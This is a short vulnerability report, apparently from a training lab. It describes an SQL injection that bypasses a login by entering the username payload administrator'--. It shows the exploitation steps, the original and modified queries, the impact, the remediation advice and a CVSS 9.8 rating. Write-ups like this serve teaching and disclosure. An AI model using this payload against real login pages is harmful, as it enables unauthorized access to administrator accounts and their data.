# SQL Injection Vulnerability Allowing Authentication Bypass

## Description
The login functionality is vulnerable to SQL Injection because user-supplied credentials are incorporated directly into SQL queries without proper sanitization. An attacker can manipulate the query logic to bypass password verification and gain unauthorized access to privileged accounts.

## Steps to Exploit
1. Navigate to the login page.
2. Enter the following username:
   ```sql
   administrator'--
   ```
3. Enter any value in the password field.
4. Submit the login form.
5. Observe successful authentication as the administrator user.

## Proof of Concept

### Payload (Username Field)
```sql
administrator'--
```

### Original Query
```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'password'
```

### Modified Query
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

## Impact
- Complete authentication bypass.
- Unauthorized administrative access.
- Exposure of sensitive application and user data.
- Potential modification or deletion of application data.

## Remediation
- Use parameterized queries or ORM frameworks.
- Implement strict server-side input validation.
- Enable multi-factor authentication (MFA) for privileged accounts.
- Monitor and log authentication events.

## CVSS Score
**CVSS v3.1: 9.8 (Critical)**

**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

## CVSS Justification

| Metric | Justification |
|----------|--------------|
| Attack Vector | Exploitable remotely over the network. |
| Attack Complexity | Low; requires a single crafted payload. |
| Privileges Required | None. |
| User Interaction | None. |
| Confidentiality | High impact due to unauthorized access to sensitive data. |
| Integrity | High impact as attackers can modify data. |
| Availability | High impact as attackers may disrupt or delete data. |